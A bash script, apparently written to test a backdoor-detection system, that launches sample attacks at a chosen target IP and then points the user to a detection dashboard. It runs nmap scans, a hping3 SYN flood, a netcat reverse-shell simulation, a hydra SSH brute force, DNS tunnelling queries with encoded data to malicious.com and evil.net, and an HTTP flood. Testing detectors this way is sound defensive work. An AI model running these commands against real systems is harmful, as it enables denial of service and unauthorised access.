#!/bin/bash
# Quick Manual Attack Testing Script
# Usage: ./quick_attack_test.sh [attack_type] [target_ip]

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default target
TARGET_IP="${2:-127.0.0.1}"

# Banner
echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════╗
║     Manual Attack Testing - Quick Reference          ║
║     Backdoor Detection System                        ║
╚═══════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Warning
echo -e "${RED}⚠️  WARNING: Only attack systems you own or have permission to test!${NC}"
echo -e "${YELLOW}Target: $TARGET_IP${NC}"
echo ""

# Function to show usage
show_usage() {
    echo "Usage: $0 [attack_type] [target_ip]"
    echo ""
    echo "Available attack types:"
    echo "  1. portscan      - Port scanning with nmap"
    echo "  2. synflood      - SYN flood attack"
    echo "  3. reverseshell  - Reverse shell connection"
    echo "  4. sshbrute      - SSH brute force"
    echo "  5. dnstunnel     - DNS tunneling simulation"
    echo "  6. httpflood     - HTTP flood attack"
    echo "  7. all           - Run all attacks sequentially"
    echo ""
    echo "Examples:"
    echo "  $0 portscan 127.0.0.1"
    echo "  $0 synflood 192.168.1.100"
    echo "  $0 all 127.0.0.1"
    echo ""
}

# Port Scan
attack_portscan() {
    echo -e "${GREEN}[*] Starting Port Scan Attack${NC}"
    echo "Command: nmap -p- $TARGET_IP"
    echo ""
    
    if ! command -v nmap &> /dev/null; then
        echo -e "${RED}Error: nmap not installed. Install with: sudo apt install nmap${NC}"
        return 1
    fi
    
    echo "Press Enter to start, or Ctrl+C to cancel..."
    read
    
    nmap -p 1-1000 $TARGET_IP
    
    echo -e "${GREEN}✓ Port scan complete${NC}"
    echo "Check dashboard for detection!"
    echo ""
}

# SYN Flood
attack_synflood() {
    echo -e "${GREEN}[*] Starting SYN Flood Attack${NC}"
    echo "Command: sudo hping3 -S -p 80 --flood $TARGET_IP"
    echo "Duration: 10 seconds"
    echo ""
    
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}Error: hping3 not installed. Install with: sudo apt install hping3${NC}"
        return 1
    fi
    
    echo "Press Enter to start, or Ctrl+C to cancel..."
    read
    
    sudo hping3 -S -p 80 --flood $TARGET_IP &
    FLOOD_PID=$!
    
    echo "Flooding for 10 seconds..."
    sleep 10
    
    sudo kill $FLOOD_PID 2>/dev/null || true
    
    echo -e "${GREEN}✓ SYN flood complete${NC}"
    echo "Check dashboard for detection!"
    echo ""
}

# Reverse Shell
attack_reverseshell() {
    echo -e "${GREEN}[*] Starting Reverse Shell Attack${NC}"
    echo ""
    echo "This will:"
    echo "  1. Start a listener on port 4444"
    echo "  2. Connect back to it (simulating backdoor)"
    echo ""
    
    if ! command -v nc &> /dev/null; then
        echo -e "${RED}Error: netcat not installed. Install with: sudo apt install netcat${NC}"
        return 1
    fi
    
    echo "Press Enter to start, or Ctrl+C to cancel..."
    read
    
    # Start listener in background
    nc -lvp 4444 > /dev/null 2>&1 &
    LISTENER_PID=$!
    
    sleep 2
    
    # Connect to listener (simulating reverse shell)
    echo "Simulating reverse shell connection..."
    (echo "whoami"; echo "exit") | nc 127.0.0.1 4444 &
    
    sleep 5
    
    # Cleanup
    kill $LISTENER_PID 2>/dev/null || true
    
    echo -e "${GREEN}✓ Reverse shell simulation complete${NC}"
    echo "Check dashboard for detection!"
    echo ""
}

# SSH Brute Force
attack_sshbrute() {
    echo -e "${GREEN}[*] Starting SSH Brute Force Attack${NC}"
    echo ""
    
    if ! command -v hydra &> /dev/null; then
        echo -e "${RED}Error: hydra not installed. Install with: sudo apt install hydra${NC}"
        return 1
    fi
    
    # Create temporary password list
    cat > /tmp/test_passwords.txt << EOF
password
123456
admin
test
EOF
    
    echo "Command: hydra -l testuser -P /tmp/test_passwords.txt ssh://$TARGET_IP"
    echo ""
    echo "Press Enter to start, or Ctrl+C to cancel..."
    read
    
    hydra -l testuser -P /tmp/test_passwords.txt ssh://$TARGET_IP -t 4 || true
    
    rm -f /tmp/test_passwords.txt
    
    echo -e "${GREEN}✓ SSH brute force complete${NC}"
    echo "Check dashboard for detection!"
    echo ""
}

# DNS Tunneling
attack_dnstunnel() {
    echo -e "${GREEN}[*] Starting DNS Tunneling Simulation${NC}"
    echo ""
    
    echo "Sending suspicious DNS queries..."
    echo ""
    
    # Suspicious domains with encoded data
    DOMAINS=(
        "aGVsbG8ud29ybGQ.malicious.com"
        "ZGF0YS5leGZpbA.malicious.com"
        "c2VjcmV0LmRhdGE.malicious.com"
        "YmFja2Rvb3I.evil.net"
    )
    
    for domain in "${DOMAINS[@]}"; do
        echo "Querying: $domain"
        nslookup "$domain" 2>/dev/null || true
        sleep 1
    done
    
    echo -e "${GREEN}✓ DNS tunneling simulation complete${NC}"
    echo "Check dashboard for detection!"
    echo ""
}

# HTTP Flood
attack_httpflood() {
    echo -e "${GREEN}[*] Starting HTTP Flood Attack${NC}"
    echo "Sending 100 rapid HTTP requests..."
    echo ""
    
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}Error: curl not installed. Install with: sudo apt install curl${NC}"
        return 1
    fi
    
    echo "Press Enter to start, or Ctrl+C to cancel..."
    read
    
    for i in {1..100}; do
        curl -s "http://$TARGET_IP" > /dev/null 2>&1 &
        if [ $((i % 10)) -eq 0 ]; then
            echo "Sent $i requests..."
        fi
    done
    
    wait
    
    echo -e "${GREEN}✓ HTTP flood complete${NC}"
    echo "Check dashboard for detection!"
    echo ""
}

# Run all attacks
attack_all() {
    echo -e "${YELLOW}Running all attacks sequentially...${NC}"
    echo ""
    
    attack_portscan
    sleep 5
    
    attack_dnstunnel
    sleep 5
    
    attack_httpflood
    sleep 5
    
    echo -e "${GREEN}✓ All attacks complete!${NC}"
    echo ""
    echo "Summary:"
    echo "  - Port scan: Completed"
    echo "  - DNS tunneling: Completed"
    echo "  - HTTP flood: Completed"
    echo ""
    echo "Check your dashboard and logs for detections!"
}

# Main
case "${1:-help}" in
    portscan)
        attack_portscan
        ;;
    synflood)
        attack_synflood
        ;;
    reverseshell)
        attack_reverseshell
        ;;
    sshbrute)
        attack_sshbrute
        ;;
    dnstunnel)
        attack_dnstunnel
        ;;
    httpflood)
        attack_httpflood
        ;;
    all)
        attack_all
        ;;
    help|--help|-h|*)
        show_usage
        exit 0
        ;;
esac

# Final message
echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Next Steps:${NC}"
echo "  1. Check dashboard: http://localhost:7000"
echo "  2. View logs: tail -f /var/log/backdoor-detection/hybrid_live.log"
echo "  3. Measure accuracy: python3 scripts/measure_accuracy.py"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
